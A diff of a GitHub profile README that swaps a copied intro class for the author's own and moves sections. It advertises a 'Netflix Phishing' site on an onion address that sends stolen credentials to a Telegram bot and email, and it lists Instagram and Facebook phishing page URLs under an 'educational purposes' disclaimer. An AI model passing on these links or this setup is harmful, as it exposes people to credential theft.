@@ -1,27 +1,4 @@
 <!--  
-
-class SoftwareQualityEngineer:
-    """We write software that tests other software"""
-
-    def __init__(self):
-        self.name = "Jake Callahan"
-        self.position = "Technical Lead"
-        self.team = "Satellite QE"
-        self.company = "Red Hat"
-        self.title_modifier = "Principal"
-
-    def __repr__(self):
-        return " - ".join((self.name, self.position, self.team, self.company))
-
-    @property
-    def social(self):
-        """Contact me easily here:"""
-        return {
-            "Twitter": "https://twitter.com/JakeJCallahan",
-            "YouTube": "https://youtube.com/c/JakeCallahan",
-        }
-
------------------------------------
  
 # Web Scrapping ...
 
@@ -142,33 +119,29 @@ Since 21 Dec 2022 (reset)
 
 <br>
 
-# `Netflix Phishing` *on* `Dark Web`
+# 🎨 `About me` :
 
 ```python
-Made with ❤️
-Netflix Phishing Website Hosted on Dark Web
+class Fresher:
+    """My Introduction"""
 
-Server (ADB):
-Running on Android Phone 24x7 via Termux
+    def __init__(self):
+        self.fname = "Vicky"
+        self.lname = "Kumar"
 
-Working Model:
-Steals credentials and sends to my Telegram Bot and on Email
+    def __repr__(self):
+        return " - ".join((self.fname, self.lname))
 
-Source Code:
-https://github.com/imvickykumar/Netflix-Phishing
-
-Onion URL:
-w5swpnkq6ml5k6fq5vwp3o7izcpthm5d4ivhm44phuunsbpfr75ii2yd.onion
+    @property
+    def social(self):
+        """Contact me easily here:"""
+        return {
+            "Twitter": "https://twitter.com/imvickykumar999",
+            "LinkedIn": "https://www.linkedin.com/in/imvickykumar999",
+        }
 ```
 
 <br>
-
-> ### `DISCLAIMER`: I have made this website to learn related concepts and for educational purposes only.
->![image](https://github.com/imvickykumar999/imvickykumar999/assets/50515418/680e5cd4-b567-45f7-bdd7-47abb8549786)
-
-<br>
-
-# 🎨 `About me` :
 
 	- Post Graduation Programme in Data Science from 
  	  International Institute of Information Technology, Bangalore
@@ -202,12 +175,44 @@ w5swpnkq6ml5k6fq5vwp3o7izcpthm5d4ivhm44phuunsbpfr75ii2yd.onion
 	</summary>
 
 <br>
-	
-<p align="center">
-<img src="https://github-profile-trophy.vercel.app/?username=imvickykumar999&theme=radical&no-bg=true&no-frame=true&column=3" alt="imvickykumar999" />
-</p>
+
+# `Netflix Phishing` *on* `Dark Web`
+
+```python
+Made with ❤️
+Netflix Phishing Website Hosted on Dark Web
+
+Server (ADB):
+Running on Android Phone 24x7 via Termux
+
+Working Model:
+Steals credentials and sends to my Telegram Bot and on Email
+
+Source Code:
+https://github.com/imvickykumar/Netflix-Phishing
+
+Onion URL:
+w5swpnkq6ml5k6fq5vwp3o7izcpthm5d4ivhm44phuunsbpfr75ii2yd.onion
+```
 
 <br>
+
+> ### `DISCLAIMER`: I have made this website to learn related concepts and for educational purposes only.
+>![image](https://github.com/imvickykumar999/imvickykumar999/assets/50515418/680e5cd4-b567-45f7-bdd7-47abb8549786)
+
+<br>
+
+	Do not try to Login here (UNSAFE)
+ 
+	Instagram Phishing Website : https://instaloginpage.pythonanywhere.com/
+ 	Facebook Phishing Website  : https://fbloginpage.pythonanywhere.com/
+
+<br>
+
+>![image](https://github.com/imvickykumar999/imvickykumar999/assets/50515418/b198b696-4ab8-433d-ad22-4e83f8bc6598)
+
+<br>
+
 <h1 align = "Center" > 🔥 Activity </h1>
 
 <br> 
@@ -217,6 +222,12 @@ w5swpnkq6ml5k6fq5vwp3o7izcpthm5d4ivhm44phuunsbpfr75ii2yd.onion
 <img alt="Vicky's GitHub Stats" src="https://github-readme-stats.vercel.app/api?username=imvickykumar999&include_all_commits=true&count_private=true&show_icons=true&theme=tokyonight">
 <br>
 -->
+
+<br>
+
+<p align="center">
+<img src="https://github-profile-trophy.vercel.app/?username=imvickykumar999&theme=radical&no-bg=true&no-frame=true&column=3" alt="imvickykumar999" />
+</p>
 
 <br>
 
@@ -444,20 +455,9 @@ Having trouble with Pages? Check out our [documentation](https://docs.github.com
 
 ![](https://hit.yhype.me/github/profile?user_id=50515418)
 
-
-
 -->
 
 </details>
-
-<br>
-
-	Do not try to Login here (UNSAFE)
- 
-	Instagram Phishing Website : https://instaloginpage.pythonanywhere.com/
- 	Facebook Phishing Website  : https://fbloginpage.pythonanywhere.com/
-
->![image](https://github.com/imvickykumar999/imvickykumar999/assets/50515418/b198b696-4ab8-433d-ad22-4e83f8bc6598)
 
 <br>
 
